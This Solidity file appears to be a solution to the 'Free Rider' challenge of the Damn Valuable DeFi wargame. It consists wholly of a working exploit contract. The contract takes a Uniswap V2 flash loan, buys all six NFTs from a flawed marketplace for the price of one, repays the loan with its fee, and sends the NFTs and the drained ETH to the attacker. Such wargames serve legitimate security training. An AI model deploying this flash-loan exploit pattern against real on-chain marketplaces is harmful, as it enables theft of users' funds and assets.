// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableNFT.sol";
import "./FreeRiderBuyer.sol";
import "./FreeRiderNFTMarketplace.sol";

interface UniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface WETH9Interface {
    function deposit() external payable;
    function withdraw(uint256) external;
    function transfer(address, uint256) external returns (bool);
}

contract FreeRiderNFTMarketplaceExploiter {
    address payable owner;
    DamnValuableNFT nft;
    WETH9Interface weth9;
    FreeRiderBuyer buyer;
    FreeRiderNFTMarketplace marketPlace;
    UniswapV2Pair pair;
    uint256 amount;
    uint256[] tokenIds;

    receive() external payable {}

    constructor(address nftAddress, address weth9Address, address buyerAddress, address payable marketPlaceAddress, address pairAddress) {
        owner = payable(msg.sender);
        nft = DamnValuableNFT(nftAddress);
        weth9 = WETH9Interface(weth9Address);
        buyer = FreeRiderBuyer(buyerAddress);
        marketPlace = FreeRiderNFTMarketplace(marketPlaceAddress);
        pair = UniswapV2Pair(pairAddress);

        tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
    }

    function exploit(uint256 _wethAmount) external {
        // Flashloan from Uniswap V2 pair
        pair.swap(
            _wethAmount,  // We only want to flashloan WETH
            0,
            address(this),
            bytes("0x00")  // Add non zero length data to enable `uniswapV2Call` callback
        );

        // Transfer NFTs to buyer
        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), address(buyer), tokenIds[i]);
        }
        // Transfer ETH to owner
        owner.transfer(address(this).balance);
    }

    function uniswapV2Call(address, uint256 wethOut, uint256, bytes calldata) external payable {
        // Withdraw received WETH flashloan
        weth9.withdraw(wethOut);
        // Buy NFTs
        marketPlace.buyMany{ value: wethOut }(tokenIds);
        // Transfer WETH back to Uniswap V2 pair along with fee
        uint256 wethWithFee = wethOut * 1000 / 996;
        weth9.deposit{ value: wethWithFee }();
        weth9.transfer(address(pair), wethWithFee);
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) 
        external
        returns (bytes4) 
    {
        return IERC721Receiver.onERC721Received.selector;
    }
}